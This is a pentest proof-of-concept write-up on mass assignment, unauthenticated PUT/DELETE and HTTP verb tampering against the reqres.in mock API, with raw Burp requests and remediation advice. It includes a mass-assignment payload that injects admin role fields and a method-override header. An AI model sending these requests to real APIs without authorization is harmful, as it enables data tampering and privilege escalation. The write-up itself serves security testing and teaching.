# POC-03 – Mass Assignment & Unauthenticated Write Operations

**Category:** API3:2023 / API5:2023
**Endpoints:** `POST /api/users`, `PUT|PATCH|DELETE /api/users/2`
**Tool:** Burp Repeater

## Test A – Unauthenticated write
```http
PUT /api/users/2 HTTP/2
Host: reqres.in
Content-Type: application/json

{"name":"pentest","job":"tester"}
```
Observe `200` with `updatedAt` – no token required.

```http
DELETE /api/users/2 HTTP/2
Host: reqres.in
```
Observe `204 No Content` without authentication.

## Test B – Mass assignment
```http
POST /api/users HTTP/2
Host: reqres.in
Content-Type: application/json

{"name":"morpheus","job":"leader","role":"admin","isAdmin":true,"id":1}
```
Check whether extra properties are reflected back/accepted.

## Test C – Verb tampering
In Repeater change the method (`GET → POST/PUT/PATCH/DELETE/OPTIONS`); add header `X-HTTP-Method-Override: DELETE`.

## Evidence
`![Mass assignment response](screenshots/poc03-mass-assignment.png)`

## Impact
Without authentication/authorization anyone could modify or delete resources; unfiltered properties could lead to privilege escalation in a real app.

## Remediation
Require authentication on all write endpoints, enforce RBAC, whitelist accepted properties (DTOs), disable unused methods.

**Severity:** Medium (CVSS 5.3) – by design in this mock API
